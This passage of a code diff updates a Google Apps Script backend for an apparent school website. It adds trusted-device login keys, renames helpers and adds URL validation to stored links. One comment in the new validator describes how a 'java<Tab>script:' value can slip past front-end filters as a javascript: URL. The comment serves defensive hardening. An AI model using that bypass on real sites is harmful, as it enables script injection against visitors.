   return checkPassword(token) ? { success: true } : authFail_();
+}
+
+function deviceKeyOk_(key) {
+  return typeof key === 'string' && key.length >= 32 && key.length <= 200;
+}
+function deviceHash_(key) {
+  return Utilities.base64Encode(Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, String(key)));
+}
+function loadDevices_() {
+  let map = {};
+  try {
+    const parsed = JSON.parse(PropertiesService.getScriptProperties().getProperty(AUTH_DEVICES_KEY) || '{}');
+    if (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) map = parsed;
+  } catch (e) {}
+  const now = Date.now(), out = {};
+  Object.keys(map).forEach(function(h) { if (Number(map[h]) > now) out[h] = Number(map[h]); });
+  return out;
+}
+function saveDevices_(map) {
+  PropertiesService.getScriptProperties().setProperty(AUTH_DEVICES_KEY, JSON.stringify(map));
+}
+function isTrustedDevice_(key) {
+  if (!deviceKeyOk_(key)) return false;
+  try { return Object.prototype.hasOwnProperty.call(loadDevices_(), deviceHash_(key)); } catch (e) { return false; }
+}
+/** 登入成功後：沿用（並延長）這台裝置的金鑰；沒有或已過期就發一把新的。回傳要交給瀏覽器保存的金鑰。 */
+function trustDevice_(existingKey) {
+  const map = loadDevices_();
+  let key = existingKey;
+  if (!deviceKeyOk_(key) || !Object.prototype.hasOwnProperty.call(map, deviceHash_(key))) {
+    key = (Utilities.getUuid() + Utilities.getUuid()).replace(/-/g, '');
+  }
+  map[deviceHash_(key)] = Date.now() + AUTH_DEVICE_TTL_MS;
+  const hashes = Object.keys(map).sort(function(a, b) { return map[a] - map[b]; });
+  while (hashes.length > AUTH_DEVICE_MAX) delete map[hashes.shift()];
+  saveDevices_(map);
+  return key;
+}
+/** 密碼變更後呼叫：清除所有受信任裝置（被盜的裝置金鑰不能留到換密碼之後） */
+function clearTrustedDevices_() {
+  try { PropertiesService.getScriptProperties().deleteProperty(AUTH_DEVICES_KEY); } catch (e) {}
 }
 
 /** 密碼變更後呼叫：讓所有已發出的 token 立即失效 */
@@ -3502,7 +3606,7 @@ function menuResetLoginLock() {
 function saveEvent(eventData, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Events');
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(h => String(h).trim());
@@ -3572,7 +3676,7 @@ function saveEvent(eventData, password) {
       sheet.appendRow(rowData);
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '活動已儲存成功！' };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -3585,7 +3689,7 @@ function saveEvent(eventData, password) {
 function deleteEvent(eventId, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Events');
     const data = sheet.getDataRange().getValues();
     const idIndex = data[0].indexOf('id');
@@ -3593,7 +3697,7 @@ function deleteEvent(eventId, password) {
     for (let i = 1; i < data.length; i++) {
       if (String(data[i][idIndex]) === String(eventId)) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '活動已成功刪除！' };
       }
     }
@@ -3609,7 +3713,7 @@ function deleteEvent(eventId, password) {
 function saveMenu(menuData, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Menus');
     const data = sheet.getDataRange().getValues();
     const dateIndex = data[0].indexOf('date');
@@ -3630,7 +3734,7 @@ function saveMenu(menuData, password) {
 
     let foundRow = -1;
     for (let i = 1; i < data.length; i++) {
-      const cellDate = normalizeDateString(data[i][dateIndex]);
+      const cellDate = normalizeDateString_(data[i][dateIndex]);
       if (cellDate === menuData.date) {
         foundRow = i + 1;
         break;
@@ -3643,7 +3747,7 @@ function saveMenu(menuData, password) {
       sheet.appendRow(rowData);
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '菜單已儲存成功！' };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -3656,15 +3760,15 @@ function saveMenu(menuData, password) {
 function deleteMenu(dateStr, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Menus');
     const data = sheet.getDataRange().getValues();
     const dateIndex = data[0].indexOf('date');
 
     for (let i = 1; i < data.length; i++) {
-      if (normalizeDateString(data[i][dateIndex]) === dateStr) {
+      if (normalizeDateString_(data[i][dateIndex]) === dateStr) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '菜單已成功刪除！' };
       }
     }
@@ -3677,7 +3781,7 @@ function deleteMenu(dateStr, password) {
 /**
  * 確保 Spotlight 工作表包含所有必要欄位（相容舊版資料庫）
  */
-function ensureSpotlightSheetHeaders(sheet) {
+function ensureSpotlightSheetHeaders_(sheet) {
   if (!sheet) return;
   const data = sheet.getDataRange().getValues();
   const required = ['id', 'title', 'subtitle', 'imageUrl', 'mediaType', 'tags', 'bulletPoints', 'startDate', 'endDate', 'duration', 'priority', 'status'];
@@ -3716,10 +3820,13 @@ function spotlightPriorityCell_(v) {
 function saveSpotlight(spData, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const imgCheck = checkStoredUrl_(spData && spData.imageUrl, { allowRelative: true });
+    if (imgCheck.error) return { success: false, error: '「圖片網址」' + imgCheck.error };
+    if (spData) spData.imageUrl = imgCheck.value;
+    const ss = getSpreadsheet_();
     let sheet = ss.getSheetByName('Spotlight');
     if (!sheet) sheet = ss.insertSheet('Spotlight');
-    ensureSpotlightSheetHeaders(sheet);
+    ensureSpotlightSheetHeaders_(sheet);
 
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(h => String(h).trim());
@@ -3759,7 +3866,7 @@ function saveSpotlight(spData, password) {
       sheet.appendRow(rowData);
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: 'Spotlight 重點活動儲存成功！', id: id };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -3772,7 +3879,7 @@ function saveSpotlight(spData, password) {
 function deleteSpotlight(spId, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Spotlight');
     const data = sheet.getDataRange().getValues();
     const idIndex = data[0].indexOf('id');
@@ -3780,7 +3887,7 @@ function deleteSpotlight(spId, password) {
     for (let i = 1; i < data.length; i++) {
       if (String(data[i][idIndex]) === String(spId)) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: 'Spotlight 已成功刪除！' };
       }
     }
@@ -3796,10 +3903,10 @@ function deleteSpotlight(spId, password) {
 function updateSpotlightsOrder(orderList, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     let sheet = ss.getSheetByName('Spotlight');
     if (!sheet) return { success: false, error: '找不到 Spotlight 工作表' };
-    ensureSpotlightSheetHeaders(sheet);
+    ensureSpotlightSheetHeaders_(sheet);
 
     const data = sheet.getDataRange().getValues();
     if (data.length <= 1) return { success: true, message: '無資料需更新' };
@@ -3835,7 +3942,7 @@ function updateSpotlightsOrder(orderList, password) {
       sheet.getRange(2, 1, data.length - 1, headers.length).sort({ column: priorityIndex + 1, ascending: true });
     }
 
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: 'Spotlight 輪播順序已成功更新！' };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -3855,10 +3962,13 @@ function saveDoc(docData, password) {
       if (n.error) return { success: false, error: n.error };
       filesNorm = n.files;
     }
+    const dlCheck = checkStoredUrl_(docData && docData.downloadUrl);
+    if (dlCheck.error) return { success: false, error: '「下載或雲端連結」' + dlCheck.error };
+    if (docData) docData.downloadUrl = dlCheck.value;
     const filesJson = filesNorm && filesNorm.length ? JSON.stringify(filesNorm) : '';
     if (filesJson.length > 45000) return { success: false, error: '檔案清單太長，請減少檔案數量或縮短檔名' };
 
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     let sheet = ss.getSheetByName('Docs');
     if (!sheet) sheet = ss.insertSheet('Docs');
 
@@ -3933,12 +4043,12 @@ function saveDoc(docData, password) {
           sheet.getRange(targetRow, colIdx + 1).setValue(fieldMap[h]);
         }
       });
-      clearAppDataCache();
+      clearAppDataCache_();
       return { success: true, message: '文件資訊已成功更新！' };
     } else {
       const newRow = headers.map(function(h) { return fieldMap[h] !== undefined ? fieldMap[h] : ''; });
       sheet.appendRow(newRow);
-      clearAppDataCache();
+      clearAppDataCache_();
       return { success: true, message: '新文件已成功加入清單！' };
     }
   } catch (err) {
@@ -3952,7 +4062,7 @@ function saveDoc(docData, password) {
 function deleteDoc(docId, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const ss = getSpreadsheet();
+    const ss = getSpreadsheet_();
     const sheet = ss.getSheetByName('Docs');
     if (!sheet) return { success: false, error: '找不到 Docs 工作表' };
     const data = sheet.getDataRange().getValues();
@@ -3975,7 +4085,7 @@ function deleteDoc(docId, password) {
         (rowName && rowName === target)
       ) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '文件已成功自清單移除！' };
       }
     }
@@ -4021,7 +4131,7 @@ function songPublicView_(song) {
 function adminSongList(password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const d = getSongsData();
+    const d = getSongsData_();
     return { success: true, songs: d.songs.map(function(s) { return Object.assign({}, s, { noDownload: songNoDownload_(s.noDownload) }); }), categories: d.categories };
   } catch (err) {
     return { success: false, error: err.toString() };
@@ -4102,7 +4212,7 @@ function adminSongSetAccess(ids, blocked, password) {
   try {
     if (!Array.isArray(ids) || ids.length === 0) return { success: false, error: '沒有選取歌曲' };
     if (ids.length > 10) return { success: false, error: '一次最多處理 10 首' };
-    const sheet = ensureSongSheetsExist().songSheet;
+    const sheet = ensureSongSheetsExist_().songSheet;
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const idCol = headers.indexOf('id'), fileCol = headers.indexOf('driveFileId'), flagCol = headers.indexOf('noDownload'), titleCol = headers.indexOf('title');
@@ -4121,7 +4231,7 @@ function adminSongSetAccess(ids, blocked, password) {
       data[r][flagCol] = keepBlocked ? true : '';
       results.push({ id: id, title: titleCol >= 0 ? String(data[r][titleCol] || '') : '', ok: a.ok, noFile: !fileId, noDownload: keepBlocked, error: a.ok ? '' : a.error });
     });
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, blocked: want, results: results };
   } catch (err) {
     return { success: false, error: String(err) };
@@ -4130,7 +4240,7 @@ function adminSongSetAccess(ids, blocked, password) {
 
 /** 讓所有「不開放」的歌曲的 Drive 檔案都確實是私人（試算表選單與批次共用；試算表上直接改旗標不會動 Drive，用這個補齊）。 */
 function syncBlockedSongAccess_() {
-  const sheet = ensureSongSheetsExist().songSheet;
+  const sheet = ensureSongSheetsExist_().songSheet;
   const data = sheet.getDataRange().getValues();
   const headers = data[0].map(function(h) { return String(h).trim(); });
   const idCol = headers.indexOf('id'), fileCol = headers.indexOf('driveFileId'), flagCol = headers.indexOf('noDownload'), titleCol = headers.indexOf('title');
@@ -4143,7 +4253,7 @@ function syncBlockedSongAccess_() {
     const a = applySongFileAccess_(fileId, true);
     if (a.ok) out.ok++; else out.failed.push({ id: String(data[i][idCol]), title: String(data[i][titleCol] || ''), error: a.error });
   }
-  clearAppDataCache();
+  clearAppDataCache_();
   return out;
 }
 const SONG_DEFAULT_CATEGORIES = ['兒歌', '律動舞蹈', '英文歌曲', '節慶歌曲', '安靜時光'];
@@ -4151,8 +4261,8 @@ const SONG_DEFAULT_CATEGORIES = ['兒歌', '律動舞蹈', '英文歌曲', '節�
 /**
  * 確保 SongCategories（類別）與 Songs（歌曲清單）兩個工作表與欄位存在；缺少的欄位會自動補上
  */
-function ensureSongSheetsExist() {
-  const ss = getSpreadsheet();
+function ensureSongSheetsExist_() {
+  const ss = getSpreadsheet_();
   if (!ss) throw new Error('無法開啟 Google 試算表');
 
   let catSheet = ss.getSheetByName('SongCategories');
@@ -4187,7 +4297,7 @@ function ensureSongSheetsExist() {
 /**
  * 從 YouTube 連結解析 11 碼影片 ID（支援 watch / youtu.be / shorts / embed / live / music.youtube.com）
  */
-function extractYouTubeId(url) {
+function extractYouTubeId_(url) {
   const str = String(url || '').trim();
   if (!str) return '';
   let m = str.match(/youtu\.be\/([A-Za-z0-9_-]{11})/);
@@ -4202,7 +4312,7 @@ function extractYouTubeId(url) {
 /**
  * 將總秒數格式化為 mm:ss 或 hh:mm:ss
  */
-function formatSecondsToMmSs(sec) {
+function formatSecondsToMmSs_(sec) {
   sec = Math.round(Number(sec) || 0);
   if (sec <= 0) return '';
   const h = Math.floor(sec / 3600);
@@ -4217,7 +4327,7 @@ function formatSecondsToMmSs(sec) {
 /**
  * 從 YouTube 影片頁面自動擷取影片長度（格式 mm:ss 或 hh:mm:ss）
  */
-function fetchYouTubeDuration(youtubeId) {
+function fetchYouTubeDuration_(youtubeId) {
   if (!youtubeId) return '';
   try {
     const res = UrlFetchApp.fetch('https://www.youtube.com/watch?v=' + youtubeId, {
@@ -4230,13 +4340,13 @@ function fetchYouTubeDuration(youtubeId) {
       const m1 = content.match(/"approxDurationMs":"(\d+)"/);
       if (m1) {
         const sec = parseInt(m1[1], 10) / 1000;
-        if (sec > 0) return formatSecondsToMmSs(sec);
+        if (sec > 0) return formatSecondsToMmSs_(sec);
       }
       // 2. lengthSeconds: "85"
       const m2 = content.match(/"lengthSeconds":"(\d+)"/);
       if (m2) {
         const sec = parseInt(m2[1], 10);
-        if (sec > 0) return formatSecondsToMmSs(sec);
+        if (sec > 0) return formatSecondsToMmSs_(sec);
       }
       // 3. itemprop="duration" content="PT1M25S" / PT1H2M30S
       const m3 = content.match(/itemprop="duration"\s+content="PT(?:(\d+)H)?(?:(\d+)M)?(?:(\d+)S)?"/i);
@@ -4245,7 +4355,7 @@ function fetchYouTubeDuration(youtubeId) {
         const m = parseInt(m3[2] || '0', 10);
         const s = parseInt(m3[3] || '0', 10);
         const sec = h * 3600 + m * 60 + s;
-        if (sec > 0) return formatSecondsToMmSs(sec);
+        if (sec > 0) return formatSecondsToMmSs_(sec);
       }
     }
   } catch (e) {
@@ -4258,8 +4368,8 @@ function fetchYouTubeDuration(youtubeId) {
  * 批次修復與同步 Songs 工作表中所有歌曲的影片長度
  * 將儲存格格式設為純文字 (@)，並自動從 YouTube 抓取真實時長
  */
-function syncAllSongDurations(forceAll) {
-  const sheets = ensureSongSheetsExist();
+function syncAllSongDurations_(forceAll) {
+  const sheets = ensureSongSheetsExist_();
   const sheet = sheets.songSheet;
   const data = sheet.getDataRange().getValues();
   if (data.length <= 1) return { success: true, updatedCount: 0 };
@@ -4282,7 +4392,7 @@ function syncAllSongDurations(forceAll) {
     const row = data[r];
     const url = row[urlCol];
     let ytId = row[ytIdCol];
-    if (!ytId && url) ytId = extractYouTubeId(url);
+    if (!ytId && url) ytId = extractYouTubeId_(url);
     if (!ytId) continue;
 
     let curDur = String(row[durCol] || '').trim();
@@ -4296,7 +4406,7 @@ function syncAllSongDurations(forceAll) {
     // 若時長為空、為 1、為 00:01 或強制全部刷新
     const isInvalid = !curDur || curDur === '1' || curDur === '00:01' || curDur === '0:01' || curDur === '00:00';
     if (isInvalid || forceAll) {
-      const realDur = fetchYouTubeDuration(ytId);
+      const realDur = fetchYouTubeDuration_(ytId);
       if (realDur) {
         sheet.getRange(r + 1, durCol + 1).setNumberFormat('@').setValue(realDur);
         updatedCount++;
@@ -4304,7 +4414,7 @@ function syncAllSongDurations(forceAll) {
     }
   }
 
-  clearAppDataCache();
+  clearAppDataCache_();
   return { success: true, updatedCount: updatedCount };
 }
 
@@ -4312,11 +4422,11 @@ function syncAllSongDurations(forceAll) {
  * 批次寫入歌曲時長，確保儲存格設為純文字 (@)
  * @param {Object} durationsMap - { [songId]: "02:43", ... }
  */
-function batchUpdateSongDurations(durationsMap) {
+function batchUpdateSongDurations_(durationsMap) {
   if (!durationsMap || typeof durationsMap !== 'object') {
     return { success: false, error: '無效的時長資料' };
   }
-  const sheets = ensureSongSheetsExist();
+  const sheets = ensureSongSheetsExist_();
   const sheet = sheets.songSheet;
   const data = sheet.getDataRange().getValues();
   if (data.length <= 1) return { success: true, updatedCount: 0 };
@@ -4340,19 +4450,19 @@ function batchUpdateSongDurations(durationsMap) {
     }
   }
 
-  clearAppDataCache();
+  clearAppDataCache_();
   return { success: true, updatedCount: updatedCount };
 }
 
 /**
  * 讀取歌曲清單與類別（依工作表順序）
  */
-function getSongsData() {
-  const sheets = ensureSongSheetsExist();
-  const categories = getSheetDataAsObjects(sheets.catSheet).map(function(r) { return String(r.categoryName || '').trim(); }).filter(Boolean);
-  const songs = getSheetDataAsObjects(sheets.songSheet).filter(function(s) { return s.id || s.title || s.youtubeUrl; });
+function getSongsData_() {
+  const sheets = ensureSongSheetsExist_();
+  const categories = getSheetDataAsObjects_(sheets.catSheet).map(function(r) { return String(r.categoryName || '').trim(); }).filter(Boolean);
+  const songs = getSheetDataAsObjects_(sheets.songSheet).filter(function(s) { return s.id || s.title || s.youtubeUrl; });
   songs.forEach(function(s) {
-    if (!s.youtubeId) s.youtubeId = extractYouTubeId(s.youtubeUrl);
+    if (!s.youtubeId) s.youtubeId = extractYouTubeId_(s.youtubeUrl);
   });
   return { songs: songs, categories: categories };
 }
@@ -4365,18 +4475,23 @@ function saveSong(songData, password, opts) {
   try {
     songData = songData || {};
     const title = String(songData.title || '').trim();
-    const youtubeUrl = String(songData.youtubeUrl || '').trim();
+    const ytCheck = checkStoredUrl_(songData.youtubeUrl === undefined || songData.youtubeUrl === null ? '' : String(songData.youtubeUrl));
+    if (ytCheck.error) return { success: false, error: '「YouTube 連結」' + ytCheck.error };
+    const dlCheck = checkStoredUrl_(songData.downloadUrl);
+    if (dlCheck.error) return { success: false, error: '「下載連結」' + dlCheck.error };
+    songData.downloadUrl = dlCheck.value;
+    const youtubeUrl = ytCheck.value;
     if (!title) return { success: false, error: '請輸入歌名！' };
     if (!youtubeUrl) return { success: false, error: '請輸入 YouTube 連結！' };
-    const youtubeId = extractYouTubeId(youtubeUrl);
+    const youtubeId = extractYouTubeId_(youtubeUrl);
     if (!youtubeId) return { success: false, error: '無法辨識 YouTube 連結，請確認網址是否正確！' };
 
     let duration = String(songData.duration || '').trim();
     if (!duration || duration === '1' || duration === '00:01') {
-      duration = fetchYouTubeDuration(youtubeId);
+      duration = fetchYouTubeDuration_(youtubeId);
     }
 
-    const sheet = ensureSongSheetsExist().songSheet;
+    const sheet = ensureSongSheetsExist_().songSheet;
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const idIndex = headers.indexOf('id');
@@ -4446,14 +4561,14 @@ function saveSong(songData, password, opts) {
           }
         }
       });
-      clearAppDataCache();
+      clearAppDataCache_();
       return Object.assign({ success: true, message: '歌曲資訊已成功更新！', songId: id, noDownload: blocked }, warnObj);
     }
     sheet.appendRow(headers.map(function(h) { return fieldMap[h] !== undefined ? fieldMap[h] : ''; }));
     if (durIndex > -1) {
       sheet.getRange(sheet.getLastRow(), durIndex + 1).setNumberFormat('@').setValue(String(fieldMap.duration || ''));
     }
-    clearAppDataCache();
+    clearAppDataCache_();
     return Object.assign({ success: true, message: '新歌曲已成功加入清單！', songId: id, noDownload: blocked }, warnObj);
   } catch (err) {
     return { success: false, error: '儲存歌曲失敗: ' + err.toString() };
@@ -4468,6 +4583,8 @@ function uploadSong(songMeta, fileObj, password) {
   try {
     if (!fileObj || !fileObj.base64) return { success: false, error: '沒有收到音樂檔內容！' };
     songMeta = songMeta || {};
+    const ytMetaCheck = checkStoredUrl_(songMeta.youtubeUrl === undefined || songMeta.youtubeUrl === null ? '' : String(songMeta.youtubeUrl));
+    if (ytMetaCheck.error) return { success: false, error: '「YouTube 連結」' + ytMetaCheck.error };
     const blocked = songNoDownload_(songMeta.noDownload);
     // 不開放下載：直接建立在私人資料夾，不會有「先公開再改私人」的空窗
     const rootFolder = blocked ? getSongPrivateFolder_() : DriveApp.getFolderById(SONGS_FOLDER_ID);
@@ -4525,13 +4642,13 @@ function uploadSong(songMeta, fileObj, password) {
 function deleteSong(songId, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const sheet = ensureSongSheetsExist().songSheet;
+    const sheet = ensureSongSheetsExist_().songSheet;
     const data = sheet.getDataRange().getValues();
     const idIndex = data[0].map(function(h) { return String(h).trim(); }).indexOf('id');
     for (let i = 1; i < data.length; i++) {
       if (String(data[i][idIndex]) === String(songId)) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '歌曲已自清單移除！' };
       }
     }
@@ -4551,8 +4668,8 @@ const THEME_DEFAULT_SEMESTERS = ['115 上學期', '115 下學期'];
 /**
  * 確保 ThemeSemesters（學期）與 Themes（每週主題）兩個工作表與欄位存在；缺少的欄位會自動補上
  */
-function ensureThemeSheetsExist() {
-  const ss = getSpreadsheet();
+function ensureThemeSheetsExist_() {
+  const ss = getSpreadsheet_();
   if (!ss) throw new Error('無法開啟 Google 試算表');
 
   let semSheet = ss.getSheetByName('ThemeSemesters');
@@ -4599,7 +4716,7 @@ function ensureThemeSheetsExist() {
 /**
  * 將儲存格中的 JSON 文字安全轉為陣列
  */
-function parseThemeJsonArray(raw) {
+function parseThemeJsonArray_(raw) {
   if (Array.isArray(raw)) return raw;
   const str = String(raw || '').trim();
   if (!str) return [];
@@ -4639,12 +4756,12 @@ function parseThemeOverviews_(rows) {
 /**
  * 讀取每週主題與學期清單
  */
-function getThemesData() {
-  const sheets = ensureThemeSheetsExist();
-  const semRows = getSheetDataAsObjects(sheets.semSheet);
+function getThemesData_() {
+  const sheets = ensureThemeSheetsExist_();
+  const semRows = getSheetDataAsObjects_(sheets.semSheet);
   const semesters = semRows.map(function(r) { return String(r.semesterName || '').trim(); }).filter(Boolean);
   const overviews = parseThemeOverviews_(semRows);
-  const themes = getSheetDataAsObjects(sheets.themeSheet).filter(function(t) { return t.id || t.themeName || t.week; });
+  const themes = getSheetDataAsObjects_(sheets.themeSheet).filter(function(t) { return t.id || t.themeName || t.week; });
   themes.forEach(function(t) {
     t.id = String(t.id || '');
     t.semester = String(t.semester || '').trim();
@@ -4656,10 +4773,10 @@ function getThemesData() {
     t.name = t.themeName;
     t.concept = t.themeConcept;
     t.dateRange = (t.startDate ? (t.startDate + (t.endDate ? (' ~ ' + t.endDate) : '')) : '');
-    t.goals = parseThemeJsonArray(t.goals).map(function(g) {
+    t.goals = parseThemeJsonArray_(t.goals).map(function(g) {
       return { activity: String((g && g.activity) || ''), course: String((g && g.course) || '') };
     });
-    t.photos = parseThemeJsonArray(t.photos).map(function(p) { return String(p || '').trim(); }).filter(Boolean);
+    t.photos = parseThemeJsonArray_(t.photos).map(function(p) { return String(p || '').trim(); }).filter(Boolean);
     t.results = t.photos;
   });
   themes.sort(function(a, b) {
@@ -4693,7 +4810,7 @@ function saveTheme(themeData, password) {
     }).filter(function(g) { return g.activity || g.course; });
     const photos = (Array.isArray(themeData.photos) ? themeData.photos : []).map(function(p) { return String(p || '').trim(); }).filter(Boolean);
 
-    const sheet = ensureThemeSheetsExist().themeSheet;
+    const sheet = ensureThemeSheetsExist_().themeSheet;
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const idIndex = headers.indexOf('id');
@@ -4729,7 +4846,7 @@ function saveTheme(themeData, password) {
       if (textCols.indexOf(h) > -1) cell.setNumberFormat('@');
       cell.setValue(fieldMap[h]);
     });
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '每週主題已儲存！', themeId: id };
   } catch (err) {
     return { success: false, error: '儲存主題失敗: ' + err.toString() };
@@ -4742,13 +4859,13 @@ function saveTheme(themeData, password) {
 function deleteTheme(themeId, password) {
   if (!checkPassword(password)) return authFail_();
   try {
-    const sheet = ensureThemeSheetsExist().themeSheet;
+    const sheet = ensureThemeSheetsExist_().themeSheet;
     const data = sheet.getDataRange().getValues();
     const idIndex = data[0].map(function(h) { return String(h).trim(); }).indexOf('id');
     for (let i = 1; i < data.length; i++) {
       if (String(data[i][idIndex]) === String(themeId)) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '主題已刪除！' };
       }
     }
@@ -4776,7 +4893,7 @@ const SEM_TASK_MAX_ROWS = 300;
 const TASK_OVERVIEW_HEADER = 'tasksOverviewImage';
 
 function ensureSemesterTasksSheet_() {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   if (!ss) throw new Error('無法開啟 Google 試算表');
   let sheet = ss.getSheetByName(SEM_TASK_SHEET);
   if (!sheet) {
@@ -4845,10 +4962,10 @@ function parseTaskOverviews_(rows) {
 
 function getSemesterTasksData_() {
   const sheet = ensureSemesterTasksSheet_();
-  const semSheet = ensureThemeSheetsExist().semSheet;
+  const semSheet = ensureThemeSheetsExist_().semSheet;
   return {
-    tasks: parseSemesterTasks_(getSheetDataAsObjects(sheet)),
-    overviews: parseTaskOverviews_(getSheetDataAsObjects(semSheet))
+    tasks: parseSemesterTasks_(getSheetDataAsObjects_(sheet)),
+    overviews: parseTaskOverviews_(getSheetDataAsObjects_(semSheet))
   };
 }
 
@@ -4931,7 +5048,7 @@ function saveSemesterTask(taskData, password) {
       id: id, semester: t.semester, group: t.group, order: order, icon: t.icon, title: t.title, description: t.description,
       updatedAt: Utilities.formatDate(new Date(), 'Asia/Taipei', 'yyyy-MM-dd')
     });
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '學期任務已儲存！', taskId: id, order: order };
   } catch (err) {
     return { success: false, error: '儲存學期任務失敗: ' + err.toString() };
@@ -4950,7 +5067,7 @@ function deleteSemesterTask(taskId, password) {
     for (let i = 1; i < data.length; i++) {
       if (String(data[i][idIndex]) === id) {
         sheet.deleteRow(i + 1);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: '學期任務已刪除！' };
       }
     }
@@ -4973,7 +5090,7 @@ function copySemesterTasks(fromSemester, toSemester, password) {
     const data = sheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const semIndex = headers.indexOf('semester');
-    const rows = getSheetDataAsObjects(sheet);
+    const rows = getSheetDataAsObjects_(sheet);
     const sources = parseSemesterTasks_(rows.filter(function(r) { return String(r.semester || '').trim() === from; }));
     if (sources.length === 0) return { success: false, error: '「' + from + '」沒有任何學期任務可以複製。' };
     for (let i = 1; i < data.length; i++) {
@@ -4989,7 +5106,7 @@ function copySemesterTasks(fromSemester, toSemester, password) {
         semester: to, group: t.group, order: t.order, icon: t.icon, title: t.title, description: t.description, updatedAt: today
       });
     });
-    clearAppDataCache();
+    clearAppDataCache_();
     return { success: true, message: '已把「' + from + '」的 ' + sources.length + ' 筆學期任務複製到「' + to + '」！', count: sources.length };
   } catch (err) {
     return { success: false, error: '複製學期任務失敗: ' + err.toString() };
@@ -5008,7 +5125,7 @@ function saveTaskOverview(semester, link, password) {
       fileId = driveFileIdFromCell_(raw);
       if (!fileId) return { success: false, error: '連結格式不對：請貼 Google Drive 圖檔的共用連結或檔案 ID。' };
     }
-    const semSheet = ensureThemeSheetsExist().semSheet;
+    const semSheet = ensureThemeSheetsExist_().semSheet;
     const data = semSheet.getDataRange().getValues();
     const headers = data[0].map(function(h) { return String(h).trim(); });
     const nameIdx = headers.indexOf('semesterName'), colIdx = headers.indexOf(TASK_OVERVIEW_HEADER);
@@ -5018,7 +5135,7 @@ function saveTaskOverview(semester, link, password) {
         const cell = semSheet.getRange(i + 1, colIdx + 1);
         cell.setNumberFormat('@');
         cell.setValue(fileId);
-        clearAppDataCache();
+        clearAppDataCache_();
         return { success: true, message: fileId ? '總覽圖已設定！' : '已清除總覽圖。', fileId: fileId };
       }
     }
@@ -5047,7 +5164,7 @@ const TR_ART_MAX_ROWS = 30;
 
 /** 確保工作表存在、欄位齊全（缺少的補在右邊）。 */
 function ensureTrSheet_(name, headers) {
-  const ss = getSpreadsheet();
+  const ss = getSpreadsheet_();
   if (!ss) throw new Error('無法開啟 Google 試算表');
   let sheet = ss.getSheetByName(name);
   if (!sheet) {
@@ -5071,6 +5188,30 @@ function ensureTrSheet_(name, headers) {
 function trStr_(v) { return String(v === undefined || v === null ? '' : v).trim(); }
 function trOrderOf_(v) { const n = Math.floor(Number(v)); return (isFinite(n) && n >= 1 && n <= TR_ORDER_MAX) ? n : TR_ORDER_MAX + 1; }
 /** 原文連結：只接受 http/https，其他一律當成沒有。 */
+/**
+ * 儲存到試算表、之後會被前台放進 href／src 的網址欄位的驗證（2026-10-23 紅隊檢查 M-1）。
+ * 空白可以（回傳 value ''）；否則必須是 http:// 或 https:// 開頭，不能含空白、Tab、換行或其他控制字元——
+ * 瀏覽器解析網址時會吞掉 Tab 與換行，「java<Tab>script:」會變回 javascript:，拿來繞過前台過濾。
+ * opts.allowRelative：允許沒有協定的相對路徑（網站自己的圖片，例如 spotlight-fluoride.jpg）；opts.allowDataImage：允許 data:image/…。
+ * 回傳 { value } 或 { error }。
+ */
+function checkStoredUrl_(u, opts) {
+  opts = opts || {};
+  if (u === undefined || u === null) return { value: '' };
+  if (typeof u !== 'string') return { error: '網址必須是文字' };
+  const v = u.trim();
+  if (!v) return { value: '' };
+  if (v.length > 2000) return { error: '網址太長（最多 2000 字）' };
+  for (let i = 0; i < v.length; i++) {
